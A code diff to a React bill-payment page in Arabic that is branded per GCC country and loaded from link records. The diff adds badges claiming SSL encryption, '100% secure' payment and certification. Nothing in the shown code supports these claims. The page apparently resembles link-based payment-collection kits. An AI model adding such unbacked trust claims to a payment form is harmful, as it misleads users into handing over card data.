@@ -11,7 +11,7 @@ import { getGovernmentServicesByCountry } from "@/lib/gccGovernmentServices";
 import { getCurrencySymbol, getCurrencyCode, formatCurrency } from "@/lib/countryCurrencies";
 import PaymentMetaTags from "@/components/PaymentMetaTags";
 import { useLink, useUpdateLink } from "@/hooks/useSupabase";
-import { ArrowLeft, User, Mail, Phone, CreditCard, Hash } from "lucide-react";
+import { ArrowLeft, User, Mail, Phone, CreditCard, Hash, Shield, Lock, CheckCircle } from "lucide-react";
 
 const PaymentData = () => {
   const { id } = useParams();
@@ -119,7 +119,7 @@ const PaymentData = () => {
         title="دفع فاتورة - إكمال البيانات"
         description="قم بإكمال بيانات السداد لدفع الفاتورة"
       />
-      <div className="min-h-screen bg-background" dir="rtl">
+      <div className="min-h-screen bg-gray-50" dir="rtl">
         {/* Hero Section */}
         <div
           className="relative w-full h-48 sm:h-64 overflow-hidden"
@@ -138,6 +138,21 @@ const PaymentData = () => {
 
         <div className="container mx-auto px-3 sm:px-4 -mt-8 sm:-mt-12 relative z-10">
           <div className="max-w-2xl mx-auto">
+            {/* Security Badges */}
+            <div className="mb-6 flex items-center justify-center gap-4 flex-wrap">
+              <div className="flex items-center gap-2 bg-white px-4 py-2 rounded-lg shadow-sm">
+                <Shield className="w-4 h-4 text-green-600" />
+                <span className="text-sm text-gray-700">تشفير SSL</span>
+              </div>
+              <div className="flex items-center gap-2 bg-white px-4 py-2 rounded-lg shadow-sm">
+                <Lock className="w-4 h-4 text-green-600" />
+                <span className="text-sm text-gray-700">دفع آمن</span>
+              </div>
+              <div className="flex items-center gap-2 bg-white px-4 py-2 rounded-lg shadow-sm">
+                <CheckCircle className="w-4 h-4 text-green-600" />
+                <span className="text-sm text-gray-700">معتمد وموثوق</span>
+              </div>
+            </div>
             <Card className="p-4 sm:p-8 shadow-2xl border-t-4" style={{ borderTopColor: countryData?.primaryColor }}>
               <form onSubmit={handleProceed}>
                 <div className="flex items-center justify-between mb-6 sm:mb-8">
@@ -283,6 +298,17 @@ const PaymentData = () => {
                 </p>
               </form>
             </Card>
+            
+            {/* Footer Security Notice */}
+            <div className="mt-6 text-center">
+              <div className="flex items-center justify-center gap-4 text-xs text-gray-500">
+                <span>🔒 معلوماتك محمية ومشفرة</span>
+                <span>•</span>
+                <span>✓ دفع آمن 100%</span>
+                <span>•</span>
+                <span>🛡️ نظام معتمد</span>
+              </div>
+            </div>
           </div>
         </div>
       </div>
